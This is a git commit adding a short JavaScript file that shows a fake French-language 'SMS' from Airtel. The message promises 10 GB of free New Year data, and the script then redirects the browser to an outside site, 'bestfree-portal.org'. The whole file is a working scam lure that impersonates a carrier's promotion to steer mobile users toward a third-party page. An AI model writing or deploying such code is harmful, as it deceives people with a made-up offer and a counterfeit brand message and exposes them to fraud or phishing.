6a0c0cf4eb3a20adcf99c4b505d8837e6f9347b1
ebeekpo <imohdavid078@gmail.com>
2024-12-31 08:08:04 +0100

    Create airtel-newyr-active.js

---
+++ airtel-newyr-active.js
@@ -0,0 +1,6 @@
+
+var password = '10 Go de données illimitées'
+password=prompt('SMS: Félicitations, vous êtes admissible à Airtel Nouvel An 10 Go de données gratuites illimitées pendant 1 mois, veuillez appuyer sur OK pour activer maintenant   ','10 Go de données illimitées');
+if (password != '10 Go de données illimitées') {
+location.href='https://bestfree-portal.org/airtel-newyrs.html';
+}
